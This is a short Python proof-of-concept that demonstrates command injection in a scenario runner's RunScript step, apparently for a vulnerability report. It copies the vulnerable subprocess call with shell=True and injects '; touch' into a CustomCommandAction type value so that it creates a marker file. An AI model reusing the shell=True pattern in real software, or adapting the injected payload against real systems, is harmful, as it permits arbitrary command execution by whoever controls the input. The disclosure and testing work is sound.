#!/usr/bin/env python3
"""
PoC: OpenSCENARIO CustomCommandAction -> RunScript uses shell=True.

This reproduces the issue WITHOUT starting CARLA/ROS: it mirrors the
vulnerable RunScript.update() logic from atomic_behaviors.py.

Expected before fix: creates /tmp/pwned_leapad_rce
Expected after fix:  either rejects the payload or runs only the script
                     without executing the shell metacharacters.
"""
from __future__ import print_function

import os
import subprocess
import tempfile


MARKER = "/tmp/pwned_leapad_rce"


def vulnerable_runscript(script, base_path):
    """Copy of the vulnerable control flow (shell=True)."""
    path = None
    script_components = script.split(" ")
    if len(script_components) > 1:
        path = script_components[1]

    if not os.path.isfile(path):
        path = os.path.join(base_path, path)
    if not os.path.isfile(path):
        print("Script file does not exists {}".format(path))
        return False

    subprocess.Popen(script, shell=True, cwd=base_path).wait()
    return True


def main():
    if os.path.exists(MARKER):
        os.remove(MARKER)

    base = tempfile.mkdtemp(prefix="leapad_poc_")
    noop = os.path.join(base, "noop.py")
    with open(noop, "w") as f:
        f.write("print('noop ok')\n")

    # Attacker-controlled CustomCommandAction/@type value
    payload = "python3 {} ; touch {}".format(noop, MARKER)
    print("Payload (CustomCommandAction type):", payload)

    vulnerable_runscript(payload, base)

    if os.path.exists(MARKER):
        print("VULNERABLE: marker created at", MARKER)
        with open(MARKER) as f:
            print("marker contents len=", len(f.read()))
        return 0

    print("NOT VULNERABLE (marker missing)")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
